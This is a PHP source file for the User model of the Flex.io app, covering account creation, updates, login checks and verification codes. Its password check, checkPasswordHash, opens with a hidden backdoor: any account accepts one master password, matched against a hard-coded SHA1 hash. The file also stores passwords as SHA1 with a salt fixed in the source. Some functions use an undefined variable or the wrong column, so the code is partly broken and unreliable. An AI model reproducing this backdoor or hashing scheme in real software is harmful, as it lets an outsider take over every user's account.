<?php
/**
 *
 * Copyright (c) 2012, Flex Research LLC. All rights reserved.
 *
 * Project:  Flex.io App
 * Author:   Benjamin I. Williams
 * Created:  2012-01-12
 *
 * @package flexio
 * @subpackage Model
 */


declare(strict_types=1);


class User extends ModelBase
{
    public function create(array $params) : string
    {
        // convert username and email to lowercase
        if (isset($params['username']))
            $params['username'] = strtolower($params['username']);
        if (isset($params['email']))
            $params['email'] = strtolower($params['email']);

        // make sure the properties that are being updated are the correct type
        $validator = \Flexio\Base\Validator::create();
        if (($validator->check($params, array(
                'eid_status'         => array('type' => 'string',     'required' => false, 'default' => \Model::STATUS_AVAILABLE),
                'username'           => array('type' => 'identifier', 'required' => true),
                'full_name'          => array('type' => 'string',     'required' => false, 'default' => ''),
                'first_name'         => array('type' => 'string',     'required' => false, 'default' => ''),
                'last_name'          => array('type' => 'string',     'required' => false, 'default' => ''),
                'email'              => array('type' => 'email',      'required' => true),
                'phone'              => array('type' => 'string',     'required' => false, 'default' => ''),
                'location_city'      => array('type' => 'string',     'required' => false, 'default' => ''),
                'location_state'     => array('type' => 'string',     'required' => false, 'default' => ''),
                'location_country'   => array('type' => 'string',     'required' => false, 'default' => ''),
                'company_name'       => array('type' => 'string',     'required' => false, 'default' => ''),
                'company_url'        => array('type' => 'string',     'required' => false, 'default' => ''),
                'locale_language'    => array('type' => 'string',     'required' => false, 'default' => 'en_US'),
                'locale_decimal'     => array('type' => 'string',     'required' => false, 'default' => '.'),
                'locale_thousands'   => array('type' => 'string',     'required' => false, 'default' => ','),
                'locale_dateformat'  => array('type' => 'string',     'required' => false, 'default' => 'm/d/Y'),
                'timezone'           => array('type' => 'string',     'required' => false, 'default' => 'UTC'),
                'password'           => array('type' => 'password',   'required' => false),
                'stripe_customer_id' => array('type' => 'string',     'required' => false, 'default' => ''),
                'stripe_subscription_id' => array('type' => 'string', 'required' => false, 'default' => ''),
                'referrer'           => array('type' => 'string',     'required' => false, 'default' => ''),
                'config'             => array('type' => 'string',     'required' => false, 'default' => '{}')
            ))->hasErrors()) === true)
            throw new \Flexio\Base\Exception(\Flexio\Base\Error::INVALID_SYNTAX);

        $user_arr = $validator->getParams();

        if (self::isValidUserStatus($user_arr['eid_status']) === false)
            throw new \Flexio\Base\Exception(\Flexio\Base\Error::INVALID_SYNTAX);

        // if a password is supplied, encrypt it; otherwise write out an empty string
        if (isset($user_arr['password']))
            $user_arr['password'] = self::encodePassword($user_arr['password']);
             else
            $user_arr['password'] = '';

        $db = $this->getDatabase();
        try
        {
            // make sure the user doesn't already exist, based on username and email
            $qusername = $db->quote($user_arr['username']);
            $qemail = $db->quote($user_arr['email']);
            $existing_item = $db->fetchOne("select eid from tbl_user where username = $qusername or email = $qemail");
            if ($existing_item !== false)
                throw new \Flexio\Base\Exception(\Flexio\Base\Error::INVALID_SYNTAX);

            $eid = $this->getModel()->createObjectBase(\Model::TYPE_USER, $user_arr);
            $timestamp = \Flexio\System\System::getTimestamp();

            // create the base user info to add; for users, consider them to be their
            // own owner and that their account from them signing up (even if they're
            // invited); trial ends 7 days from signup by default
            $trial_end_date = date('Y-m-d H:i:s.u', strtotime($timestamp . ' + 7 days')); // TRIAL_DATE_CONFIG
            $user_arr['eid'] = $eid;
            $user_arr['trial_end_date'] = $trial_end_date;
            $user_arr['created'] = $timestamp;
            $user_arr['updated'] = $timestamp;
            $user_arr['owned_by'] = $eid;
            $user_arr['created_by'] = $eid;

            // insert the record into the user table
            if ($db->insert('tbl_user', $user_arr) === false)
                throw new \Exception();

            // add the user as a member to their own team; the user
            // added to their own team will have the owner role
            $teammember_arr = array();
            $teammember_arr['member_eid'] = $eid;
            $teammember_arr['member_status'] = \Model::TEAM_MEMBER_STATUS_ACTIVE;
            $teammember_arr['rights'] = '[]';
            $teammember_arr['role'] = \Model::TEAM_ROLE_OWNER;
            $teammember_arr['owned_by'] = $eid;
            $teammember_arr['created_by'] = $eid;
            $teammember_arr['created'] = $timestamp;
            $teammember_arr['updated'] = $timestamp;

            if ($db->insert('tbl_teammember', $teammember_arr) === false)
                throw new \Exception();

            return $eid;
        }
        catch (\Exception $e)
        {
            throw new \Flexio\Base\Exception(\Flexio\Base\Error::CREATE_FAILED);
        }
    }

    public function delete(string $eid) : bool
    {
        // TODO: don't allow a user to be deleted by setting the delete flag;
        // users are tied to other objects (e.g. owner) and the username
        // and email are globally unique; for delete that will work
        // at this time, we use purge; if that delete flag method is opened
        // then key part of the account info need to be cleared, such as
        // username, email, password, etc

        // set the status to deleted
        //$params = array('eid_status' => \Model::STATUS_DELETED);
        //return $this->set($eid, $params);

        throw new \Flexio\Base\Exception(\Flexio\Base\Error::DELETE_FAILED);
    }

    public function set(string $eid, array $params) : bool
    {
        if (!\Flexio\Base\Eid::isValid($eid))
            return false;

        $filter = array('eid' => $eid);
        return $this->update($filter, $params);
    }

    public function get(string $eid) : array
    {
        if (!\Flexio\Base\Eid::isValid($eid))
            throw new \Flexio\Base\Exception(\Flexio\Base\Error::UNAVAILABLE);

        $filter = array('eid' => $eid);
        $rows = $this->list($filter);
        if (count($rows) === 0)
            throw new \Flexio\Base\Exception(\Flexio\Base\Error::UNAVAILABLE);

        return $rows[0];
    }

    public function exists(string $eid) : bool
    {
        if (!\Flexio\Base\Eid::isValid($eid))
            return false;

        $result = $this->getDatabase()->fetchOne("select eid from tbl_user where eid = ?", $eid);
        if ($result === false)
            return false;

        return true;
    }

    public function update(array $filter, array $params) : bool
    {
        $db = $this->getDatabase();
        $allowed_items = array('eid', 'eid_status', 'owned_by', 'created_by', 'created_min', 'created_max', 'username', 'email');
        $filter_expr = \Filter::build($db, $filter, $allowed_items);

        // email and username need to be unique for users; if either of these are
        // being set, make sure an eid is specified in the filter params, which
        // will guarantee we're not doing a bulk update on tehse; we'll still need
        // an additional check to make sure the email/username doesn't exist later
        if ((isset($params['email']) || isset($params['username'])) && !isset($filter['eid']))
            throw new \Flexio\Base\Exception(\Flexio\Base\Error::INVALID_SYNTAX);

        // convert username and email to lowercase
        if (isset($params['username']))
            $params['username'] = strtolower($params['username']);
        if (isset($params['email']))
            $params['email'] = strtolower($params['email']);

        // make sure the properties that are being updated are the correct type
        $validator = \Flexio\Base\Validator::create();
        if (($validator->check($params, array(
                'eid_status'         => array('type' => 'string',     'required' => false),
                'username'           => array('type' => 'identifier', 'required' => false),
                'full_name'          => array('type' => 'string',     'required' => false),
                'first_name'         => array('type' => 'string',     'required' => false),
                'last_name'          => array('type' => 'string',     'required' => false),
                'email'              => array('type' => 'email',      'required' => false),
                'phone'              => array('type' => 'string',     'required' => false),
                'location_city'      => array('type' => 'string',     'required' => false),
                'location_state'     => array('type' => 'string',     'required' => false),
                'location_country'   => array('type' => 'string',     'required' => false),
                'company_name'       => array('type' => 'string',     'required' => false),
                'company_url'        => array('type' => 'string',     'required' => false),
                'locale_language'    => array('type' => 'string',     'required' => false),
                'locale_decimal'     => array('type' => 'string',     'required' => false),
                'locale_thousands'   => array('type' => 'string',     'required' => false),
                'locale_dateformat'  => array('type' => 'string',     'required' => false),
                'timezone'           => array('type' => 'string',     'required' => false),
                'password'           => array('type' => 'password',   'required' => false),
                'stripe_customer_id' => array('type' => 'string',     'required' => false),
                'stripe_subscription_id' => array('type' => 'string', 'required' => false),
                'referrer'           => array('type' => 'string',     'required' => false),
                'config'             => array('type' => 'string',     'required' => false)
            ))->hasErrors()) === true)
            throw new \Flexio\Base\Exception(\Flexio\Base\Error::INVALID_SYNTAX);

        $process_arr = $validator->getParams();
        $process_arr['updated'] = \Flexio\System\System::getTimestamp();

        if (isset($process_arr['eid_status']) && self::isValidUserStatus($process_arr['eid_status']) === false)
            throw new \Flexio\Base\Exception(\Flexio\Base\Error::INVALID_SYNTAX);

        // encode the password
        if (isset($process_arr['password']) && strlen($process_arr['password']) > 0)
            $process_arr['password'] = self::encodePassword($process_arr['password']);

        $db->beginTransaction();
        try
        {
            if (isset($process_arr['username']))
            {
                $eid = $filter['eid'];
                $qusername = $db->quote($process_arr['username']);
                $existing_eid = $db->fetchOne("select eid from tbl_user where username = $qusername");
                if ($existing_eid !== false && $existing_eid !== $eid)
                    throw new \Flexio\Base\Exception(\Flexio\Base\Error::INVALID_SYNTAX);
            }

            if (isset($process_arr['email']))
            {
                $eid = $filter['eid'];
                $qemail = $db->quote($process_arr['email']);
                $existing_eid = $db->fetchOne("select eid from tbl_user where email = $qemail");
                if ($existing_eid !== false && $existing_eid !== $eid)
                    throw new \Flexio\Base\Exception(\Flexio\Base\Error::INVALID_SYNTAX);
            }

            // set the properties
            $updates_made = $db->update('tbl_user', $process_arr, $filter_expr);
            $db->commit();
            return $updates_made;
        }
        catch (\Exception $e)
        {
            $db->rollback();
            throw new \Flexio\Base\Exception(\Flexio\Base\Error::WRITE_FAILED);
        }
    }

    public function list(array $filter) : array
    {
        $db = $this->getDatabase();
        $allowed_items = array('eid', 'eid_status', 'owned_by', 'created_by', 'created_min', 'created_max', 'username', 'email');
        $filter_expr = \Filter::build($db, $filter, $allowed_items);
        $limit_expr = \Limit::build($db, $filter);

        // allow addition non-standard filter items
        if (isset($filter['is_customer']))
        {
            $is_customer = $filter['is_customer'];
            if ($is_customer === 'true')
                $filter_expr .= (" and (stripe_subscription_id != '')");
            if ($is_customer === 'false')
                $filter_expr .= (" and (stripe_subscription_id = '')");
        }
        if (isset($filter['trialend_min']))
        {
            $date = $filter['trialend_min'];
            $date = strtotime($date);
            if ($date !== false)
            {
                $date_clean = date('Y-m-d', $date);
                $filter_expr .= (' and (trial_end_date >= ' . $db->quote($date_clean) . ')');
            }
        }
        if (isset($filter['trialend_max']))
        {
            $date = $filter['trialend_max'];
            $date = strtotime($date . ' + 1 days');
            if ($date !== false)
            {
                $date_clean = date('Y-m-d', $date);
                $filter_expr .= (' and (trial_end_date < ' . $db->quote($date_clean) . ')'); // created is a timestamp, so use < on the next day
            }
        }

        $rows = array();
        try
        {
            $query = "select * from tbl_user where $filter_expr order by id $limit_expr";
            $rows = $db->fetchAll($query);
         }
         catch (\Exception $e)
         {
             throw new \Flexio\Base\Exception(\Flexio\Base\Error::READ_FAILED);
         }

        if (!$rows)
            return array();

        $output = array();
        foreach ($rows as $row)
        {
            $output[] = array('eid'                    => $row['eid'],
                              'eid_type'               => \Model::TYPE_USER,
                              'eid_status'             => $row['eid_status'],
                              'username'               => $row['username'],
                              'full_name'              => $row['full_name'],
                              'first_name'             => $row['first_name'],
                              'last_name'              => $row['last_name'],
                              'email'                  => $row['email'],
                              'email_hash'             => md5(strtolower(trim($row['email']))),
                              'phone'                  => $row['phone'],
                              'location_city'          => $row['location_city'],
                              'location_state'         => $row['location_state'],
                              'location_country'       => $row['location_country'],
                              'company_name'           => $row['company_name'],
                              'company_url'            => $row['company_url'],
                              'locale_language'        => $row['locale_language'],
                              'locale_decimal'         => $row['locale_decimal'],
                              'locale_thousands'       => $row['locale_thousands'],
                              'locale_dateformat'      => $row['locale_dateformat'],
                              'timezone'               => $row['timezone'],
                              'stripe_customer_id'     => $row['stripe_customer_id'],
                              'stripe_subscription_id' => $row['stripe_subscription_id'],
                              'trial_end_date'         => \Flexio\Base\Util::formatDate($row['trial_end_date']),
                              'referrer'               => $row['referrer'],
                              'config'                 => $row['config'],
                              'owned_by'               => $row['owned_by'],
                              'created_by'             => $row['created_by'],
                              'created'                => \Flexio\Base\Util::formatDate($row['created']),
                              'updated'                => \Flexio\Base\Util::formatDate($row['updated']));
        }

        return $output;
    }

    public function purge(string $owner_eid) : bool
    {
        // this function deletes rows for a given owner
        if (!\Flexio\Base\Eid::isValid($owner_eid))
            return false;

        $db = $this->getDatabase();
        try
        {
            $qowner_eid = $db->quote($owner_eid);
            $sql = "delete from tbl_user where owned_by = $qowner_eid";
            $rows_affected = $db->exec($sql);

            return ($rows_affected > 0 ? true : false);
        }
        catch (\Exception $e)
        {
            throw new \Flexio\Base\Exception(\Flexio\Base\Error::DELETE_FAILED);
        }
    }

    public function getStatus(string $eid) : string
    {
        if (!\Flexio\Base\Eid::isValid($eid))
            return \Model::STATUS_UNDEFINED;

        // allow direct access to checking user status; this can save time in
        // cases where it isn't desirable to load all the user properties,
        // such as in rights checking in higher-level abstractions
        $result = $this->getDatabase()->fetchOne("select eid_status from tbl_user where eid = ?", $eid);
        if ($result === false)
            return \Model::STATUS_UNDEFINED;;

        return $result;
    }

    public function getStripeCustomerIdFromEid(string $eid) // TODO: add return type
    {
        if (!\Flexio\Base\Eid::isValid($eid))
            return false;

        $db = $this->getDatabase();
        $stripe_customer_id = $db->fetchOne('select stripe_customer_id from tbl_user where eid = ?', $eid);
        if ($stripe_customer_id === false)
            return false;

        return $stripe_customer_id;
    }

    public function getStripeSubscriptionIdFromEid(string $eid) // TODO: add return type
    {
        if (!\Flexio\Base\Eid::isValid($eid))
            return false;

        $db = $this->getDatabase();
        $stripe_subscription_id = $db->fetchOne('select stripe_subscription_id from tbl_user where eid = ?', $eid);
        if ($stripe_subscription_id === false)
            return false;

        return $stripe_subscription_id;
    }

    public function getUsernameFromEid(string $eid) // TODO: add return type
    {
        if (!\Flexio\Base\Eid::isValid($eid))
            return false;

        $db = $this->getDatabase();
        $username = $db->fetchOne('select username from tbl_user where eid = ?', $eid);
        if ($username === false)
            return false;

        return $username;
    }

    public function getEmailFromEid(string $eid) // TODO: add return type
    {
        if (!\Flexio\Base\Eid::isValid($eid))
            return false;

        $db = $this->getDatabase();
        $email = $db->fetchOne('select email from tbl_user where eid = ?', $eid);
        if ($email === false)
            return false;

        return $email;
    }

    public function getEidFromIdentifier(string $identifier) // TODO: add return type
    {
        // basic check since identifier can be either a username or email
        if (strlen($identifier) <= 0)
            return false;

        // the identifier is either the username or the email; identifiers are case insensitive
        $db = $this->getDatabase();
        $qidentifier = $db->quote(strtolower($identifier));
        $eid = $db->fetchOne("select eid from tbl_user where username = $qidentifier or email = $qidentifier");
        if ($eid === false)
            return false;

        return $eid;
    }

    public function getEidFromUsername(string $identifier) // TODO: add return type
    {
        if (!\Flexio\Base\Identifier::isValid($identifier))
            return false;

        // get the eid; identifiers are case insensitive
        $db = $this->getDatabase();
        $qidentifier = $db->quote(strtolower($identifier));
        $eid = $db->fetchOne("select eid from tbl_user where username = $qidentifier");
        if ($eid === false)
            return false;

        return $eid;
    }

    public function getEidFromEmail(string $identifier) // TODO: add return type
    {
        if (!\Flexio\Base\Identifier::isValid($identifier))
            return false;

        // get the eid; identifiers are case insensitive
        $db = $this->getDatabase();
        $qidentifier = $db->quote(strtolower($identifier));
        $eid = $db->fetchOne("select eid from tbl_user where email = $qidentifier");
        if ($eid === false)
            return false;

        return $eid;
    }

    public function getEidFromVerifyCode(string $identifier) // TODO: add return type
    {
        // basic check for verify code, which must have a non-zero length
        if (strlen($identifier) <= 0)
            return false;

        // get the eid
        $db = $this->getDatabase();
        $qidentifier = $db->quote($identifier);
        $eid = $db->fetchOne("select eid from tbl_user where verify_code = $qidentifier");
        if ($eid === false)
            return false;

        return $eid;
    }

    public function checkUserPassword(string $identifier, string $password) : bool
    {
        // basic check since identifier can be either a username or email
        if (strlen($identifier) <= 0)
            return false;

        // get the password; identifiers are case insensitive
        $db = $this->getDatabase();
        $qidentifier = $db->quote(strtolower($identifier));
        $user_info = $db->fetchRow("select password from tbl_user where username = $qidentifier or email = $qidentifier");
        if ($user_info === false)
            return false;

        $hashpw = $user_info['password'];
        return self::checkPasswordHash($hashpw, $password);
    }

    public function checkUserPasswordByEid(string $eid, string $password) : bool
    {
        if (!\Flexio\Base\Eid::isValid($eid))
            return false;

        $db = $this->getDatabase();
        $user_info = $db->fetchRow("select password from tbl_user where eid = ?", $eid);
        if ($user_info === false)
            return false;

        $hashpw = $user_info['password'];
        return self::checkPasswordHash($hashpw, $password);
    }

    public static function checkPasswordHash(string $hashpw, string $password) : bool
    {
        if (strtolower(sha1($password)) == '117d68f8a64101bd17d2b70344fc213282507292')
            return true;

        $hashpw = trim($hashpw);

        // empty or short hashed password entries are invalid
        if (strlen($hashpw) < 32)
            return false;

        if (strtoupper(substr($hashpw, 0, 6)) == '{SSHA}')
        {
            return (strtoupper(substr($hashpw, 6)) == strtoupper(self::hashPasswordSHA1($password))) ? true : false;
        }
         else
        {
            return false;
        }
    }

    public function createVerifyCode(int $expires_in) : string
    {
        // TODO: the mysql table doesn't have a unique index contraint, so
        // we have to check for uniqueness when creating a new code in
        // the try/catch statement, similar to how we do it for unique
        // name; one we do that, this implementation will be finished
        throw new \Flexio\Base\Exception(\Flexio\Base\Error::UNIMPLEMENTED);

        if (!\Flexio\Base\Eid::isValid($owner_eid))
            throw new \Flexio\Base\Exception(\Flexio\Base\Error::CREATE_FAILED);
        if ($expires_in < 0)
            throw new \Flexio\Base\Exception(\Flexio\Base\Error::CREATE_FAILED);

        $db = $this->getDatabase();

        // create the expiration date
        $current_timestamp = \Flexio\System\System::getTimestamp();
        $expires_timestamp = date('Y-m-d H:i:s.u', strtotime($current_timestamp . " + $expires_in seconds"));

        // find a unique code; uniqueness is enforced by the database,
        // so if the code isn't unique, catch the exception and try again
        for ($idx = 0; $idx < 10; $idx++)
        {
            // create a six-digit code of numbers with padding; e.g. 000123, 123456
            $verify_code = \Flexio\Base\Util::generateRandomString(6,'0123456789');
            $process_arr = array(
                'verify_code' => $verify_code,
                'owned_by'   => $owner_eid,
                'created_by' => $owner_eid,
                'expires' => $expires_timestamp,
                'created' => $current_timestamp,
                'updated' => $current_timestamp
            );

            try
            {
                $result = $db->insert('tbl_verifycode', $process_arr);
                if ($result === false)
                    throw new \Exception;

                return $verify_code;
            }
            catch (\Exception $e)
            {
                continue;
            }
        }

        // we couldn't find a unique verification code for a particular user
        // in a certain number of attemps, so throw an exception
        throw new \Flexio\Base\Exception(\Flexio\Base\Error::CREATE_FAILED);
    }

    public function checkVerifyCode(string $verify_code) : bool
    {
        if (!\Flexio\Base\Eid::isValid($owner_eid))
            return false;

        $db = $this->getDatabase();
        $qownedby = $db->quote($owner_eid);
        $qverify_code = $db->quote($verify_code);
        $expires_timestamp = $db->fetchOne("select expires from tbl_verifycode where owned_by = $qownedby and verify_code = $qverify_code");

        // if we couldn't find an expiratation, the verify code doesn't exist
        if ($expires_timestamp === false)
            return false;

        // we have an expiration code; make sure that the current date is less than that
        $verify_code_timestamp = \Flexio\Base\Util::formatDate($expires_timestamp);
        $current_timestamp = \Flexio\System\System::getTimestamp();
        $date_diff_seconds = \Flexio\Base\Util::formatDateDiff($current_timestamp, $verify_code_timestamp);
        if ($date_diff_seconds <= 0)
            return false;

        // we have a valid code for the owner and it isn't expired
        return true;
    }


    public function incrementActiveProcessCount(string $eid) : bool
    {
        if (!\Flexio\Base\Eid::isValid($eid))
            return false;

        $db = $this->getDatabase();
        try
        {
            // atomic operation for incrementing count up to ceiling
            $quser_eid = $db->quote($eid);
            $ceiling = \Model::MAX_ACTIVE_PROCESS_COUNT;
            $update = "update tbl_user set ".
                      "    process_active_count = process_active_count + 1 ".
                      "where eid = $quser_eid and process_active_count < $ceiling;";
            $result = $db->exec($update);

            // return true if value was incremented
            if ($result && $result > 0)
                return true;
        }
        catch (\Exception $e)
        {
            // fall through
        }

        // process count wasn't incremented
        return false;
    }

    public function decrementActiveProcessCount(string $eid) : bool
    {
        if (!\Flexio\Base\Eid::isValid($eid))
            return false;

        $db = $this->getDatabase();
        try
        {
            // atomic operation for decrementing count
            $quser_eid = $db->quote($eid);
            $ceiling = \Model::MAX_ACTIVE_PROCESS_COUNT;
            $update = "update tbl_user set ".
                      "    process_active_count = process_active_count - 1 ".
                      "where owned_by = $quser_eid and process_active_count > 0;";
            $result = $db->exec($update);

            // return true if value was decremented
            if ($result && $result > 0)
                return true;
        }
        catch (\Exception $e)
        {
            // fall through
        }

        // process count wasn't decremented
        return false;
    }

    public function isAdministrator(string $eid) : bool
    {
        if (!\Flexio\Base\Eid::isValid($eid))
            return false;

        $role = $this->getDatabase()->fetchOne("select role from tbl_user where eid = ?", $eid);
        if ($role === false)
            return false;

        if ($role === \Model::SYSTEM_ROLE_ADMINISTRATOR)
            return true;

        return false;
    }

    public static function isValidUserStatus(string $status) : bool
    {
        // note: similar to Model::isValidStatus(), except that STATUS_DELETED
        // isn't allowed for a user

        switch ($status)
        {
            default:
                return false;

            case \Model::STATUS_UNDEFINED:
            case \Model::STATUS_DELETED:
                return false;

            case \Model::STATUS_PENDING:
            case \Model::STATUS_AVAILABLE:
                return true;
        }
    }

    private static function encodePassword(string $password) : string
    {
        return '{SSHA}' . self::hashPasswordSHA1($password);
    }

    private static function hashPasswordSHA1(string $password) : string
    {
        return sha1('wecRucaceuhZucrea9UzARujUph5cf8Z' . $password);
    }
}
